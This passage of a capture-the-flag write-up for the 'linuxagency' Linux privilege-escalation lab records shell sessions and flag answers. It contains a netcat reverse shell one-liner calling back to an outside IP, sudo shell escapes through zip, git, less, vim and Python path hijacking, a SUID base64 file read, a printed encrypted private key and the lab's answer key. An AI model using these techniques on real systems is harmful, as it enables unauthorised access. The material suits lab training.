drwxr-xr-x 10 mission29 mission29 4096 Jan 12  2021 bl-kernel
drwxr-xr-x  2 mission29 mission29 4096 Jan 12  2021 bl-languages
drwxr-xr-x 27 mission29 mission29 4096 Jan 12  2021 bl-plugins
drwxr-xr-x  4 mission29 mission29 4096 Jan 12  2021 bl-themes
-rw-r--r--  1 mission29 mission29  394 Jan 12  2021 .htaccess
-rw-r--r--  1 mission29 mission29   44 Jan 12  2021 .htpasswd
-rw-r--r--  1 mission29 mission29  900 Jan 12  2021 index.php
-rw-r--r--  1 mission29 mission29 1083 Jan 12  2021 LICENSE
mission29@linuxagency:~/bludit$ cat .htpasswd
mission30{d25b4c9fac38411d2fcb4796171bda6e}
mission29@linuxagency:~/bludit$

```

```
31. What is viktor's Flag?
viktor{b52c60124c0f8f85fe647021122b3d9a}

```

### Task 4: Privilege Escalation 

Welcome to Privilege Escalation, 47. Glad you made it this far!!! Now, here are some special targets. Your Target is to teach these bad guys a lesson.

Good luck 47!!!!

```
1. su into viktor user using viktor's flag as password
Ans: No Answer Needed.

```

```
mission30@linuxagency:~$ ls -la
total 36
drwxr-x--- 3 mission30 mission30 4096 Jan 12 2021 .
drwxr-xr-x 45 root root 4096 Jan 12 2021 ..
lrwxrwxrwx 1 mission30 mission30 9 Jan 12 2021 .bash_history -> /dev/null
-rw-r--r-- 1 mission30 mission30 220 Jan 12 2021 .bash_logout
-rw-r--r-- 1 mission30 mission30 3771 Jan 12 2021 .bashrc
drwxr-xr-x 3 mission30 mission30 4096 Jan 12 2021 Escalator
-rw-r--r-- 1 mission30 mission30 8980 Jan 12 2021 examples.desktop
-rw-r--r-- 1 mission30 mission30 807 Jan 12 2021 .profile
mission30@linuxagency:~$ cd Escalator/
mission30@linuxagency:~/Escalator$ ls -la
total 16
drwxr-xr-x 3 mission30 mission30 4096 Jan 12 2021 .
drwxr-x--- 3 mission30 mission30 4096 Jan 12 2021 ..
drwxr-xr-x 8 mission30 mission30 4096 Jan 12 2021 .git
-rw-r--r-- 1 mission30 mission30 35 Jan 12 2021 sources.py
mission30@linuxagency:~/Escalator$ cat sources.py
print("Hey I have learn't python")
mission30@linuxagency:~/Escalator$ cd .git/
mission30@linuxagency:~/Escalator/.git$ ls -la
total 52
drwxr-xr-x 8 mission30 mission30 4096 Jan 12 2021 .
drwxr-xr-x 3 mission30 mission30 4096 Jan 12 2021 ..
drwxr-xr-x 2 mission30 mission30 4096 Jan 12 2021 branches
-rw-r--r-- 1 mission30 mission30 21 Jan 12 2021 COMMIT_EDITMSG
-rw-r--r-- 1 mission30 mission30 261 Jan 12 2021 config
-rw-r--r-- 1 mission30 mission30 73 Jan 12 2021 description
-rw-r--r-- 1 mission30 mission30 23 Jan 12 2021 HEAD
drwxr-xr-x 2 mission30 mission30 4096 Jan 12 2021 hooks
-rw-r--r-- 1 mission30 mission30 145 Jan 12 2021 index
drwxr-xr-x 2 mission30 mission30 4096 Jan 12 2021 info
drwxr-xr-x 3 mission30 mission30 4096 Jan 12 2021 logs
drwxr-xr-x 10 mission30 mission30 4096 Jan 12 2021 objects
drwxr-xr-x 5 mission30 mission30 4096 Jan 12 2021 refs
mission30@linuxagency:~/Escalator/.git$ git log
commit 24cbf44a9cb0e65883b3f76ef5533a2b2ef96497 (HEAD -> master, origin/master)
Author: root <root@Xyan1d3>
Date: Mon Jan 11 15:37:56 2021 +0530

    My 1st python Script

commit e0b807dbeb5aba190d6307f072abb60b34425d44
Author: root <root@Xyan1d3>
Date: Mon Jan 11 15:36:40 2021 +0530

    Your flag is viktor{b52c60124c0f8f85fe647021122b3d9a}

mission30@linuxagency:~/Escalator/.git$

```

```
2. What is dalia's flag?
Ans: dalia{4a94a7a7bb4a819a63a33979926c77dc}

```

```
viktor@linuxagency:/opt/scripts$ nano 47.sh
viktor@linuxagency:/opt/scripts$ cat 47.sh
#!/bin/bash
#echo "Hello 47"
rm -rf /dev/shm/
#echo "Here time is a great matter of essence"
rm -rf /tmp/
viktor@linuxagency:/opt/scripts$ nano 47.sh
viktor@linuxagency:/opt/scripts$
viktor@linuxagency:/opt/scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.110 4242 >/tmp/f" > 47.sh

C:\Users\sam>ncat -lvnp 4242
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 10.10.195.97.
Ncat: Connection from 10.10.195.97:50292.
c/bin/sh: 0: can't access tty; job control turned off
$ ls
/bin/sh: 1: cls: not found
$ ls
examples.desktop
flag.txt
$ cat flag.txt
dalia{4a94a7a7bb4a819a63a33979926c77dc}
$
```

```
3. What is silvio's flag?
Ans: silvio{657b4d058c03ab9988875bc937f9c2ef}

```

```
dalia@linuxagency:~$ TF=$(mktemp -u)
TF=$(mktemp -u)
dalia@linuxagency:~$ sudo -u silvio tc/hosts -T -TT 'sh #'
sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 37%)
$ id
id
uid=1032(silvio) gid=1032(silvio) groups=1032(silvio)
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
silvio@linuxagency:/home/dalia$ cd ~
cd ~
silvio@linuxagency:~$ ls -la
ls -la
total 40
drwxr-x---  3 silvio silvio 4096 Jan 12  2021 .
drwxr-xr-x 45 root   root   4096 Jan 12  2021 ..
lrwxrwxrwx  1 silvio silvio    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 silvio silvio  220 Jan 12  2021 .bash_logout
-rw-r--r--  1 silvio silvio 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 silvio silvio 8980 Jan 12  2021 examples.desktop
-rw-r--r--  1 silvio silvio   41 Jan 12  2021 flag.txt
drwxr-xr-x  3 silvio silvio 4096 Jan 12  2021 .local
-rw-r--r--  1 silvio silvio  807 Jan 12  2021 .profile
silvio@linuxagency:~$ cat flag.txt
cat fla.txt
cat: fla.txt: No such file or directory
silvio@linuxagency:~$ cat flag.txt
cat flag.txt
silvio{657b4d058c03ab9988875bc937f9c2ef}
silvio@linuxagency:~$

```

```
4. What is reza's flag?
Ans: reza{2f1901644eda75306f3142d837b80d3e}

```

```
silvio@linuxagency:~$
silvio@linuxagency:~$ sudo -l
sudo -l
Matching Defaults entries for silvio on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User silvio may run the following commands on linuxagency:
    (reza) SETENV: NOPASSWD: /usr/bin/git

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password:
Sorry, try again.
Password:


Sorry, try again.
Password:
sudo: 3 incorrect password attempts
silvio@linuxagency:~$

silvio@linuxagency:~$ sudo -u reza h -c "exec sh 0<&1"' git -p help
sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
$ ls -la
ls -la
ls: cannot open directory '.': Permission denied
$ id
id
uid=1033(reza) gid=1033(reza) groups=1033(reza)
$ which python
which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
reza@linuxagency:/home/silvio$ ls -la
ls -la
ls: cannot open directory '.': Permission denied
reza@linuxagency:/home/silvio$ cd ~
cd ~
reza@linuxagency:~$ ls -la
ls -la
total 40
drwxr-x---  3 reza reza 4096 Jan 12  2021 .
drwxr-xr-x 45 root root 4096 Jan 12  2021 ..
lrwxrwxrwx  1 reza reza    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 reza reza  220 Jan 12  2021 .bash_logout
-rw-r--r--  1 reza reza 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 reza reza 8980 Jan 12  2021 examples.desktop
-r--------  1 reza reza   39 Jan 12  2021 flag.txt
drwxr-xr-x  3 reza reza 4096 Jan 12  2021 .local
-rw-r--r--  1 reza reza  807 Jan 12  2021 .profile
reza@linuxagency:~$ cat flag.txt
cat flag.txt
reza{2f1901644eda75306f3142d837b80d3e}
reza@linuxagency:~$

```

```
5. What is jordan's flag?
Ans: jordan{fcbc4b3c31c9b58289b3946978f9e3c3}

```

```
reza@linuxagency:/home/reza$ sudo -l
Matching Defaults entries for reza on localhost:
env_reset, env_file=/etc/sudoenv, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser reza may run the following commands on localhost:
(jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py

reza@linuxagency:/home/reza$ echo "import pty;pty.spawn('/bin/bash')" > /tmp/shop.py
reza@linuxagency:/home/reza$ sudo -u jordan PYTHONPATH=/tmp/ /opt/scripts/Gun-Shop.py

jordan@linuxagency:~$ cat flag.txt | rev
jordan{fcbc4b3c31c9b58289b3946978f9e3c3}
jordan@linuxagency:~$

```

```
6. What is ken's flag?
Ans: ken{4115bf456d1aaf012ed4550c418ba99f}

```

```
jordan@linuxagency:/home/dalia$ sudo -l
sudo -l
Matching Defaults entries for jordan on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jordan may run the following commands on linuxagency:
    (ken) NOPASSWD: /usr/bin/less
jordan@linuxagency:/home/dalia$

jordan@linuxagency:~$ sudo -u ken less /etc/profile
sudo -u ken less /etc/profile
$ whoami
whoami
ken

ken@linuxagency:~$ ls -la
ls -la
total 36
drwxr-x---  2 ken  ken  4096 Jan 12  2021 .
drwxr-xr-x 45 root root 4096 Jan 12  2021 ..
lrwxrwxrwx  1 ken  ken     9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 ken  ken   220 Jan 12  2021 .bash_logout
-rw-r--r--  1 ken  ken  3771 Jan 12  2021 .bashrc
-rw-r--r--  1 ken  ken  8980 Jan 12  2021 examples.desktop
-r--------  1 ken  ken    38 Jan 12  2021 flag.txt
-rw-r--r--  1 ken  ken   807 Jan 12  2021 .profile
ken@linuxagency:~$ cat flag.txt
cat flag.txt
ken{4115bf456d1aaf012ed4550c418ba99f}
ken@linuxagency:~$

```

```
7. What is sean's flag?
Ans: sean{4c5685f4db7966a43cf8e95859801281}

```

```
ken@linuxagency:~$ sudo -l
sudo -l
Matching Defaults entries for ken on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ken may run the following commands on linuxagency:
    (sean) NOPASSWD: /usr/bin/vim
ken@linuxagency:~$ sudo -u sean vim -c ':!/bin/sh'

$ python -c 'import pty;pty.spawn("/bin/bash")'

sean@linuxagency:~$ grep -rn "sean{" /var/log
grep -rn "sean{" /var/log
grep: /var/log/btmp: Permission denied
grep: /var/log/btmp.1: Permission denied
grep: /var/log/speech-dispatcher: Permission denied
/var/log/syslog.bak:98675:Jan 12 02:58:58 ubuntu kernel: [    0.000000] ACPI: LAPIC_NMI (acpi_id[0x6d] high edge lint[0x1]) : sean{4c5685f4db7966a43cf8e95859801281} VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==
grep: /var/log/tallylog: Permission denied
grep: /var/log/installer/partman: Permission denied
grep: /var/log/installer/casper.log: Permission denied
grep: /var/log/installer/debug: Permission denied
grep: /var/log/installer/version: Permission denied
grep: /var/log/installer/syslog: Permission denied
sean@linuxagency:~$

$ echo "VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==" | base64 -d
The password of penelope is p3nelope

```

```
8. What is penelope's flag?
Ans: penelope{2da1c2e9d2bd0004556ae9e107c1d222}

```

```
$ ssh penelope@10.10.60.72
penelope@10.10.60.72's password:
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

penelope@linuxagency:~$

penelope@linuxagency:~$ ls -la
total 84
drwxr-x---  4 penelope penelope  4096 Sep  3 23:40 .
drwxr-xr-x 45 root     root      4096 Jan 12  2021 ..
-rwsr-sr-x  1 maya     maya     39096 Jan 12  2021 base64
lrwxrwxrwx  1 penelope penelope     9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 penelope penelope   220 Jan 12  2021 .bash_logout
-rw-r--r--  1 penelope penelope  3771 Jan 12  2021 .bashrc
drwx------  2 penelope penelope  4096 Sep  3 23:40 .cache
-rw-r--r--  1 penelope penelope  8980 Jan 12  2021 examples.desktop
-r--------  1 penelope penelope    43 Jan 12  2021 flag.txt
drwx------  3 penelope penelope  4096 Jan 12  2021 .gnupg
-rw-r--r--  1 penelope penelope   807 Jan 12  2021 .profile
penelope@linuxagency:~$ cat flag.txt
penelope{2da1c2e9d2bd0004556ae9e107c1d222}
penelope@linuxagency:~$

```

```
8. What is maya's flag
Ans: maya{a66e159374b98f64f89f7c8d458ebb2b}

```

```
penelope@linuxagency:~$ LFILE=/home/maya/flag.txt
penelope@linuxagency:~$ /home/penelope/base64 "$LFILE" | base64 -d
maya{a66e159374b98f64f89f7c8d458ebb2b}
penelope@linuxagency:~$

```

```
maya@linuxagency:~$ ls -la
total 52
drwxr-x---  5 maya maya 4096 Jan 15  2021 .
drwxr-xr-x 45 root root 4096 Jan 12  2021 ..
lrwxrwxrwx  1 maya maya    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 maya maya  220 Jan 12  2021 .bash_logout
-rw-r--r--  1 maya maya 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 maya maya  519 Jan 12  2021 elusive_targets.txt
-rw-r--r--  1 maya maya 8980 Jan 12  2021 examples.desktop
-r--------  1 maya maya   39 Jan 12  2021 flag.txt
drwxr-xr-x  3 maya maya 4096 Jan 12  2021 .local
drwxr-xr-x  2 maya maya 4096 Jan 15  2021 old_robert_ssh
-rw-r--r--  1 maya maya  807 Jan 12  2021 .profile
drwx------  2 maya maya 4096 Jan 12  2021 .ssh
maya@linuxagency:~$ cd old_robert_ssh/
maya@linuxagency:~/old_robert_ssh$ ls -la
total 16
drwxr-xr-x 2 maya maya 4096 Jan 15  2021 .
drwxr-x--- 5 maya maya 4096 Jan 15  2021 ..
-rw------- 1 maya maya 1766 Jan 12  2021 id_rsa
-rw-r--r-- 1 maya maya  401 Jan 15  2021 id_rsa.pub
maya@linuxagency:~/old_robert_ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7903FE7BDBA051C4B0BF7C6C5C597E0B

iRzpH6qjXDvmVU5wwYU7TQfyQHIqYzR0NquznZ3OiXyaSOaovgPXdGP3r50vfIV6
i07H7ZSczz4nuenYJGIE7ZfDYtVVA9R6IdcIZecYF2L3OfHoR/ghGOlbLC+Hyvky
RMcrEgajpdV7zCPRHckiBioxzx1K7kfkinyiSBoV9pz9PuAKo47OHtKDdtjWFV+A
PkiWa8aCmAGShC9RZkZLMRhVkR0TZGOgJGTs/MncopyJJ6TgJ9AzHcQo3vcf5A3k
7f3+9Niw7mMFmWrU35WOBpAynGkK9eDTvt/DoIMJcT9KL1BBaEzReO8mETNqfT5G
QncO/4tBSG7QaU6pQkd+UiZCtltp47Tu9hwSEsxDIleespuBn9mDHrYtBDC8jEBq
nqm0sDdYOPzjUTMDSJgqmLZ0lzagTa1OMNUlvRAz5Sde4bKAoYRgVvBWJ4whn4H+
OIHhFQ6tbCVr/0tosYrc9ehM4N4TiJ0SyfrP1XmDo8bud+UtNf2Tf/vKjYT9FP+/
+HqrIn1ou4Cvvu/jPbwVU8Ejh4CX/TJhDK6JqLzsqOp0M8jBccCR+zrRXcZsKLnG
JUTqxKwML7FhRiAgeTmOUx43XVOvzrNOmZ+8EmbmE4fW5x9UKR2nzKgILwHApayK
dmKbym96uSoQOm4KycXjoDVw9nAgRQQVQ+3Ndy0JwuyXN7keNcesEN5hb5VNN9VP
jp+mS+c/CctyLSgZkGJif2r2N+3x2AZFkDs059sPQB8UGvI4w41qGBubfsHAvVPW
KH+HAgj1i1RM0/XZ5XKIl0K4iO/eQ5xTAPah51f6LCYnZo/G6fM7IT72k0Z0KMZ8
EiySGtRCcv7vrkVRjkgmw4lAeGLJ9FBOw8IdKa9ftYJauKY/E0Gs1Qhefl+3K2BB
4PJ+Pr/doZ3Dkq4Q/YPrKnbKEbs/3Zvbu/XT5y+joS6tzF3Raz6xW0kg3NyaA1B5
V5zoj0/tnBb9Lc0YH7s2QT+9drFH4w8tb5kjyd1jlER3Hs4m31cniCsxDlKoTwk/
uAGurW23NZ4QF+3/PgjZRhudpNjcOP69Ys2XGAecxO9uBx9JjPR/cn9c54v4s/kH
n6v24eXF2uGGlEsvEpzIpk6UDap7YoxnRKIPo0mZ5G7/MS9+RL6dv9rmJ6IQd7Cr
fPjhz8snqfuGCAVveKWIOPnlfYiYJ2nQ6yA1Soyt9outfLbwIzDh7e+eqaOP2amh
rGCqwxrj9cj4sH/MzvKZVARzH3hs39wRmoEtx9ML/uXsp22DqUODOxc7cdUlRs99
zTj8CHFpM6X+ihSF33Eg0qBJwkyWzdKQiFKNTm8ld4wzov1tdKeRC7nlUh5F4lkf
yExiUTllJq8pJ3JAC/LEvQXF041fcmQ0RvoL1n3nyqIvvOjuY7UDZrcmuWQ+epdE
APKzOgkxhEqsozt8kj810m3bjIWngenwRcGL6M1ZsvwT1YwGUKG47wX2Ze3tp3ge
K4NUD9GdZJIiu8qdpyMIFKR9MfM3Pur5JRUK0IjCD43xk9p6LZYK00C3N2F4exwM
Ye5kHYeqZLpl4ljZSBoNtEK1BbYSffBt2XdoQsAvft1iwjdtZ9E644oTp9QYjloE
-----END RSA PRIVATE KEY-----
maya@linuxagency:~/old_robert_ssh$

maya@linuxagency:~/old_robert_ssh$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDG993ZxnyDUpDtF/8R0oZv5XWMY0heGLopfBteg79pQb3sIOjeuy8+Cx+P2i7PybERDVVq3c5tw+wpqHjQCKhH+wFgo8ApUlzIeiJ0AdExtLh0+BY/4xf5A4qdc1xT5Jl592BX/vH4epHji9YSLB8bzOlx5stAyqhgosuDCehdgrwZE2fX37DuLtSvR4Jw53Yq8XO3XE9fwYFytvaGbr48lI727vJ4kcUGEe5tjveHNQLoMhJEabcNIdmoH9uFm0aDj/tbWzyjFGS38s/5TCod7SHMRYXSbzy2BcNwLerPfsTQgIza92om2HyovHWx4olt9doZbJ8Fg2LLmgXlz5Cv robert@0fd0d503162d
maya@linuxagency:~/old_robert_ssh$


```

